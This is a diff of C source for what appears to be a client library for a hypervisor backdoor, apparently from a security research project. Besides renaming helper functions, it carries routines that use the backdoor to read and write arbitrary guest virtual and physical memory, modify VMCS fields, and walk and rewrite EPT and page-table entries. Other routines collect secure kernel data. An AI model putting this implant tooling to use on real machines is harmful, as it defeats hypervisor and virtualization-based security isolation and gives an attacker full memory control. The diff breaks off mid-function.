@@ -1,8 +1,5 @@
 #include "stdafx.h"
 
-// winio driver binary
-#include "../winio_sys.h"
-
 // amount of time to collect secure kernel information
 #define SK_INFO_TIMEOUT 5
 
@@ -25,7 +22,7 @@ int backdoor_invalidate_caches(void)
     uint64_t ret = backdoor_call(HVBD_C_INVL_CACHES, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
 
@@ -42,13 +39,13 @@ int backdoor_info(HVBD_INFO *info)
     uint64_t ret = backdoor_call(HVBD_C_INFO, &arg0, &arg1, &arg2);
     if (ret == HVBD_E_NO_BACKDOOR)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
+        bd_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
         return -1;
     }
 
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
 
@@ -66,7 +63,7 @@ int backdoor_info(HVBD_INFO *info)
     ret = backdoor_call(HVBD_C_INFO_EX, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
 
@@ -78,7 +75,7 @@ int backdoor_info(HVBD_INFO *info)
     ret = backdoor_call(HVBD_C_INFO_EX2, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
 
@@ -94,7 +91,7 @@ int backdoor_virt_read(uint64_t addr, void *buff, int size)
     int temp_size = _ALIGN_UP(size, sizeof(uint64_t));
 
     // allocate temporary qword aligned buffer
-    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
+    uint8_t *temp = (uint8_t *)bd_alloc(temp_size);
     if (temp == NULL)
     {
         return -1;
@@ -117,9 +114,9 @@ int backdoor_virt_read(uint64_t addr, void *buff, int size)
             // read single memory qword
             if ((ret = backdoor_call(HVBD_C_VIRT_READ, &arg0, &arg1, &arg2)) == HVBD_E_NO_BACKDOOR)
             {
-                dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
+                bd_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
 
-                M_FREE(temp);
+                bd_free(temp);
                 return -1;
             }
 
@@ -133,9 +130,9 @@ int backdoor_virt_read(uint64_t addr, void *buff, int size)
 
         if (ret != HVBD_E_SUCCESS)
         {
-            dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+            bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
 
-            M_FREE(temp);
+            bd_free(temp);
             return -1;
         }    
 
@@ -145,7 +142,7 @@ int backdoor_virt_read(uint64_t addr, void *buff, int size)
     // copy readed data to calee buffer
     memcpy(buff, temp, size);
 
-    M_FREE(temp);
+    bd_free(temp);
     return 0;
 }
 //--------------------------------------------------------------------------------------
@@ -160,13 +157,13 @@ int backdoor_virt_read_64(uint64_t addr, uint64_t *val)
     uint64_t ret = backdoor_call(HVBD_C_VIRT_READ, &arg0, &arg1, &arg2);
     if (ret == HVBD_E_NO_BACKDOOR)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
+        bd_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
         return -1;
     }
 
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
 
@@ -222,7 +219,7 @@ int backdoor_virt_write(uint64_t addr, void *buff, int size)
     int temp_size = _ALIGN_UP(size, sizeof(uint64_t));
 
     // allocate temporary qword aligned buffer
-    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
+    uint8_t *temp = (uint8_t *)bd_alloc(temp_size);
     if (temp == NULL)
     {
         return -1;
@@ -231,7 +228,7 @@ int backdoor_virt_write(uint64_t addr, void *buff, int size)
     // read original memory contents
     if (backdoor_virt_read(addr, temp, temp_size) != 0)
     {
-        M_FREE(temp);
+        bd_free(temp);
         return -1;
     }
 
@@ -249,18 +246,18 @@ int backdoor_virt_write(uint64_t addr, void *buff, int size)
         uint64_t ret = backdoor_call(HVBD_C_VIRT_WRITE, &arg0, &arg1, &arg2);
         if (ret == HVBD_E_NO_BACKDOOR)
         {
-            M_FREE(temp);
+            bd_free(temp);
             return -1;
         }
 
         if (ret != HVBD_E_SUCCESS)
         {
-            M_FREE(temp);
+            bd_free(temp);
             return -1;
         }
     }    
 
-    M_FREE(temp);
+    bd_free(temp);
     return 0;
 }
 //--------------------------------------------------------------------------------------
@@ -275,13 +272,13 @@ int backdoor_virt_write_64(uint64_t addr, uint64_t val)
     uint64_t ret = backdoor_call(HVBD_C_VIRT_WRITE, &arg0, &arg1, &arg2);
     if (ret == HVBD_E_NO_BACKDOOR)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
+        bd_printf(__FUNCTION__"() ERROR: backdoor is not present\n");
         return -1;
     }
 
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
     
@@ -352,7 +349,7 @@ int backdoor_virt_map(uint64_t pte_index, uint64_t phys_addr)
 
     backdoor_invalidate_caches();
 
-    SwitchToThread();
+    bd_yeld();
 
     return 0;
 }
@@ -369,7 +366,7 @@ int backdoor_virt_unmap(uint64_t pte_index)
 
     backdoor_invalidate_caches();
 
-    SwitchToThread();
+    bd_yeld();
 
     return 0;
 }
@@ -380,7 +377,7 @@ int backdoor_phys_read(uint64_t addr, void *buff, int size)
     uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);
 
     // allocate temporary qword aligned buffer
-    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
+    uint8_t *temp = (uint8_t *)bd_alloc(temp_size);
     if (temp == NULL)
     {
         return -1;
@@ -394,7 +391,7 @@ int backdoor_phys_read(uint64_t addr, void *buff, int size)
         // read page contents from virtual memory
         if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
         {
-            M_FREE(temp);
+            bd_free(temp);
             return -1;            
         }
         
@@ -405,7 +402,7 @@ int backdoor_phys_read(uint64_t addr, void *buff, int size)
     // copy readed data to calee buffer
     memcpy(buff, temp + (addr - temp_addr), size);
 
-    M_FREE(temp);
+    bd_free(temp);
     return 0;
 }
 //--------------------------------------------------------------------------------------
@@ -435,7 +432,7 @@ int backdoor_phys_write(uint64_t addr, void *buff, int size)
     uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);
 
     // allocate temporary qword aligned buffer
-    uint8_t *temp = (uint8_t *)M_ALLOC(temp_size);
+    uint8_t *temp = (uint8_t *)bd_alloc(temp_size);
     if (temp == NULL)
     {
         return -1;
@@ -449,7 +446,7 @@ int backdoor_phys_write(uint64_t addr, void *buff, int size)
         // read page contents from virtual memory
         if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
         {
-            M_FREE(temp);
+            bd_free(temp);
             return -1;            
         }
         
@@ -468,7 +465,7 @@ int backdoor_phys_write(uint64_t addr, void *buff, int size)
         // write page contents into virtual memory
         if (backdoor_virt_write(0, temp + i, PAGE_SIZE) != 0)
         {
-            M_FREE(temp);
+            bd_free(temp);
             return -1;            
         }
         
@@ -476,7 +473,7 @@ int backdoor_phys_write(uint64_t addr, void *buff, int size)
         backdoor_virt_unmap(0);   
     }
 
-    M_FREE(temp);
+    bd_free(temp);
     return 0;
 }
 //--------------------------------------------------------------------------------------
@@ -510,7 +507,7 @@ int backdoor_vmread(uint64_t val, uint64_t *data)
     uint64_t ret = backdoor_call(HVBD_C_VMREAD, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
 
@@ -529,7 +526,7 @@ int backdoor_vmwrite(uint64_t val, uint64_t data)
     uint64_t ret = backdoor_call(HVBD_C_VMWRITE, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }
 
@@ -542,39 +539,60 @@ int backdoor_ept_list(EPT_INFO *ept_list)
     uint64_t arg1 = 0;
     uint64_t arg2 = 0;    
 
-    dbg_printf("[+] Collecting EPT address list...\n");
+    bd_printf("[+] Collecting EPT address list...\n");
 
     // start collecting EPT
     uint64_t ret = backdoor_call(HVBD_C_EPT_GET_START, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }    
 
     for (int i = EPT_INFO_TIMEOUT; i > 0; i -= 1)
     {
-        dbg_printf("\r> %d   ", i);
+        bd_printf("\r> %d   ", i);
 
-        Sleep(1000);
+        bd_sleep(1000);
     }
 
-    dbg_printf("\r");
+    bd_printf("\r");
 
     // stop collecting EPT
     ret = backdoor_call(HVBD_C_EPT_GET_STOP, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }    
 
-    dbg_printf("[+] Reading collected data from 0x%llx...\n", arg0);
+    bd_printf("[+] Reading collected data from 0x%llx...\n", arg0);
 
     if (backdoor_virt_read(arg0, ept_list, sizeof(EPT_INFO) * EPT_MAX_COUNT) != 0)
     {
         return -1;
     }    
+
+    return 0;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_ept_info_addr(uint64_t *addr)
+{
+    uint64_t arg0 = 0;
+    uint64_t arg1 = 0;
+    uint64_t arg2 = 0;
+
+    // get HVBD_DATA::EptInfo address
+    uint64_t ret = backdoor_call(HVBD_C_EPT_GET_STOP, &arg0, &arg1, &arg2);
+    if (ret != HVBD_E_SUCCESS)
+    {
+        return -1;
+    }
+
+    if (addr)
+    {
+        *addr = arg0;
+    }
 
     return 0;
 }
@@ -586,22 +604,22 @@ int backdoor_ept_dump(uint64_t pml4_addr)
     X64_PAGE_DIRECTORY_ENTRY_4K *PD_page = NULL;
     X64_PAGE_TABLE_ENTRY_4K *PT_page = NULL;
     
-    if ((PML4_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
+    if ((PML4_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)bd_alloc(PAGE_SIZE)) == NULL)
     {
         goto _end;
     }
 
-    if ((PDPT_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
+    if ((PDPT_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)bd_alloc(PAGE_SIZE)) == NULL)
     {
         goto _end;
     }
 
-    if ((PD_page = (X64_PAGE_DIRECTORY_ENTRY_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
+    if ((PD_page = (X64_PAGE_DIRECTORY_ENTRY_4K *)bd_alloc(PAGE_SIZE)) == NULL)
     {
         goto _end;
     }
 
-    if ((PT_page = (X64_PAGE_TABLE_ENTRY_4K *)M_ALLOC(PAGE_SIZE)) == NULL)
+    if ((PT_page = (X64_PAGE_TABLE_ENTRY_4K *)bd_alloc(PAGE_SIZE)) == NULL)
     {
         goto _end;
     }    
@@ -627,7 +645,7 @@ int backdoor_ept_dump(uint64_t pml4_addr)
             continue;
         }
 
-        dbg_printf("PML4E #%.4x: 0x%.16llx\n", i_1, PML4_entry->Uint64);
+        bd_printf("PML4E #%.4x: 0x%.16llx\n", i_1, PML4_entry->Uint64);
         
         // read PDPT memory page
         if (backdoor_phys_read(PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress), 
@@ -645,7 +663,7 @@ int backdoor_ept_dump(uint64_t pml4_addr)
                 continue;
             }
 
-            dbg_printf("PDPTE #%.4x: 0x%.16llx\n", i_2, PDPT_entry->Uint64);
+            bd_printf("PDPTE #%.4x: 0x%.16llx\n", i_2, PDPT_entry->Uint64);
 
             // check for page size flag
             if ((PDPT_entry->Uint64 & PDPTE_PDE_PS) == 0)
@@ -668,7 +686,7 @@ int backdoor_ept_dump(uint64_t pml4_addr)
                         continue;
                     }
 
-                    dbg_printf("  PDE #%.4x: 0x%.16llx\n", i_3, PD_entry->Uint64);
+                    bd_printf("  PDE #%.4x: 0x%.16llx\n", i_3, PD_entry->Uint64);
 
                     // check for page size flag
                     if ((PD_entry->Uint64 & PDPTE_PDE_PS) == 0)
@@ -695,7 +713,7 @@ int backdoor_ept_dump(uint64_t pml4_addr)
                             host_addr = PFN_TO_PAGE(PT_entry->Bits.PageTableBaseAddress);
                             guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3) | PTE_ADDR(i_4);                            
                             
-                            dbg_printf(
+                            bd_printf(
                                 "             0x%.16llx -> 0x%.16llx 4K %s%s%s %s\n",
                                 guest_addr, host_addr,
                                 EPT_R(PT_entry->Uint64) ? "R" : "", EPT_W(PT_entry->Uint64) ? "W" : "", 
@@ -712,7 +730,7 @@ int backdoor_ept_dump(uint64_t pml4_addr)
                         host_addr = PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress);
                         guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3);
                             
-                        dbg_printf(
+                        bd_printf(
                             "             0x%.16llx -> 0x%.16llx 2M %s%s%s %s\n",
                             guest_addr, host_addr,
                             EPT_R(PD_entry->Uint64) ? "R" : "", EPT_W(PD_entry->Uint64) ? "W" : "", 
@@ -721,7 +739,7 @@ int backdoor_ept_dump(uint64_t pml4_addr)
                         );
                     }
 
-                    dbg_printf("\n");
+                    bd_printf("\n");
 
                     PD_entry += 1;
                 }
@@ -732,7 +750,7 @@ int backdoor_ept_dump(uint64_t pml4_addr)
                 host_addr = PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress);
                 guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2);
 
-                dbg_printf(
+                bd_printf(
                     "             0x%.16llx -> 0x%.16llx 1G %s%s%s %s\n",
                     guest_addr, host_addr,
                     EPT_R(PDPT_entry->Uint64) ? "R" : "", EPT_W(PDPT_entry->Uint64) ? "W" : "", 
@@ -741,12 +759,12 @@ int backdoor_ept_dump(uint64_t pml4_addr)
                 );
             }
 
-            dbg_printf("\n");
+            bd_printf("\n");
 
             PDPT_entry += 1;
         }
 
-        dbg_printf("\n");
+        bd_printf("\n");
 
         PML4_entry += 1;
     }
@@ -757,22 +775,22 @@ _end:
 
     if (PT_page)
     {
-        M_FREE(PT_page);
+        bd_free(PT_page);
     }
 
     if (PD_page)
     {
-        M_FREE(PD_page);
+        bd_free(PD_page);
     }
 
     if (PDPT_page)
     {
-        M_FREE(PDPT_page);
+        bd_free(PDPT_page);
     }
 
     if (PML4_page)
     {
-        M_FREE(PML4_page);
+        bd_free(PML4_page);
     }
 
     return ret;
@@ -784,7 +802,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
     if (!m_quiet)
     {
-        dbg_printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
+        bd_printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
     }    
 
     if (backdoor_phys_read_64(
@@ -796,7 +814,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "EPT PML4E 0x%llx[0x%llx]: 0x%llx\n", 
             PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
         );
@@ -804,7 +822,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
     if (!EPT_PRESENT(PML4_entry.Uint64))
     {
-        dbg_printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -819,7 +837,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "EPT PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
             PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
         );
@@ -827,7 +845,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
     if (!EPT_PRESENT(PDPT_entry.Uint64))
     {
-        dbg_printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -845,7 +863,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
         if (!m_quiet)
         {
-            dbg_printf(
+            bd_printf(
                 "  EPT PDE 0x%llx[0x%llx]: 0x%llx\n", 
                 PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                 PD_entry.Uint64
@@ -854,7 +872,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
         if (!EPT_PRESENT(PD_entry.Uint64))
         {
-            dbg_printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
+            bd_printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
             return -1;
         }
 
@@ -872,7 +890,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
 
             if (!m_quiet)
             {
-                dbg_printf(
+                bd_printf(
                     "  EPT PTE 0x%llx[0x%llx]: 0x%llx\n", 
                     PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                     PT_entry.Uint64
@@ -888,7 +906,7 @@ int backdoor_phys_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr)
             }
             else
             {
-                dbg_printf("ERROR: EPT PTE for 0x%llx is not present\n", addr);
+                bd_printf("ERROR: EPT PTE for 0x%llx is not present\n", addr);
             }
         }
         else
@@ -918,7 +936,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!m_quiet)
     {
-        dbg_printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
+        bd_printf(__FUNCTION__"(): EPT PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
     }    
 
     if (backdoor_phys_read_64(
@@ -930,7 +948,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "EPT PML4E 0x%llx[0x%llx]: 0x%llx\n", 
             PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
         );
@@ -938,7 +956,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!EPT_PRESENT(PML4_entry.Uint64))
     {
-        dbg_printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -953,7 +971,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "EPT PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
             PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
         );
@@ -961,7 +979,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!EPT_PRESENT(PDPT_entry.Uint64))
     {
-        dbg_printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -979,7 +997,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
         if (!m_quiet)
         {
-            dbg_printf(
+            bd_printf(
                 "  EPT PDE 0x%llx[0x%llx]: 0x%llx\n", 
                 PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                 PD_entry.Uint64
@@ -988,7 +1006,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
         if (!EPT_PRESENT(PD_entry.Uint64))
         {
-            dbg_printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
+            bd_printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
             return -1;
         }
 
@@ -1004,7 +1022,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
             if (!m_quiet)
             {
-                dbg_printf(
+                bd_printf(
                     "  PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
                     PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                     *old, entry
@@ -1020,12 +1038,12 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
         }
         else
         {
-            dbg_printf("ERROR: 2M page");
+            bd_printf("ERROR: 2M page");
         }                  
     }
     else
     {
-        dbg_printf("ERROR: 1G page\n");
+        bd_printf("ERROR: 1G page\n");
     }
 
     return -1;
@@ -1039,7 +1057,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
     if (!m_quiet)
     {
-        dbg_printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
+        bd_printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
     }
 
     phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);
@@ -1059,7 +1077,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "PML4E 0x%llx[0x%llx]: 0x%llx\n", 
             PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
         );
@@ -1067,7 +1085,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
     if (PML4_entry.Bits.Present == 0)
     {
-        dbg_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -1090,7 +1108,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
             PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
         );
@@ -1098,7 +1116,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
     if (PDPT_entry.Bits.Present == 0)
     {
-        dbg_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -1124,7 +1142,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
         if (!m_quiet)
         {
-            dbg_printf(
+            bd_printf(
                 "  PDE 0x%llx[0x%llx]: 0x%llx\n", 
                 PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                 PD_entry.Uint64
@@ -1133,7 +1151,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
         if (PD_entry.Bits.Present == 0)
         {
-            dbg_printf("ERROR: PDE for 0x%llx is not present\n", addr);
+            bd_printf("ERROR: PDE for 0x%llx is not present\n", addr);
             return -1;
         }
 
@@ -1159,7 +1177,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
 
             if (!m_quiet)
             {
-                dbg_printf(
+                bd_printf(
                     "  PTE 0x%llx[0x%llx]: 0x%llx\n", 
                     PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                     PT_entry.Uint64
@@ -1183,7 +1201,7 @@ int backdoor_virt_translate(uint64_t addr, uint64_t *ret, uint64_t pml4_addr, ui
             }
             else
             {
-                dbg_printf("ERROR: PTE for 0x%llx is not present\n", addr);
+                bd_printf("ERROR: PTE for 0x%llx is not present\n", addr);
             }
         }
         else
@@ -1229,7 +1247,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!m_quiet)
     {
-        dbg_printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
+        bd_printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
     }
 
     phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);
@@ -1249,7 +1267,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "PML4E 0x%llx[0x%llx]: 0x%llx\n", 
             PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
         );
@@ -1257,7 +1275,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (PML4_entry.Bits.Present == 0)
     {
-        dbg_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -1280,7 +1298,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (!m_quiet)
     {
-        dbg_printf(
+        bd_printf(
             "PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
             PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
         );
@@ -1288,7 +1306,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
     if (PDPT_entry.Bits.Present == 0)
     {
-        dbg_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
+        bd_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
         return -1;
     }
 
@@ -1314,7 +1332,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
         if (!m_quiet)
         {
-            dbg_printf(
+            bd_printf(
                 "  PDE 0x%llx[0x%llx]: 0x%llx\n", 
                 PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                 PD_entry.Uint64
@@ -1323,7 +1341,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
         if (PD_entry.Bits.Present == 0)
         {
-            dbg_printf("ERROR: PDE for 0x%llx is not present\n", addr);
+            bd_printf("ERROR: PDE for 0x%llx is not present\n", addr);
             return -1;
         }
 
@@ -1347,7 +1365,7 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
 
             if (!m_quiet)
             {
-                dbg_printf(
+                bd_printf(
                     "  PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
                     PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                     *old, entry
@@ -1363,12 +1381,12 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
         }
         else
         {
-            dbg_printf("ERROR: 2M page\n");
+            bd_printf("ERROR: 2M page\n");
         }                  
     }
     else
     {
-        dbg_printf("ERROR: 1G page\n");
+        bd_printf("ERROR: 1G page\n");
     }
 
     return -1;
@@ -1380,34 +1398,34 @@ int backdoor_sk_info(SK_INFO *sk_info, uint64_t *call_count)
     uint64_t arg1 = 0;
     uint64_t arg2 = 0;    
 
-    dbg_printf("[+] Collecting secure kernel information...\n");
+    bd_printf("[+] Collecting secure kernel information...\n");
 
     // start collecting secure kernel information
     uint64_t ret = backdoor_call(HVBD_C_SK_GET_START, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
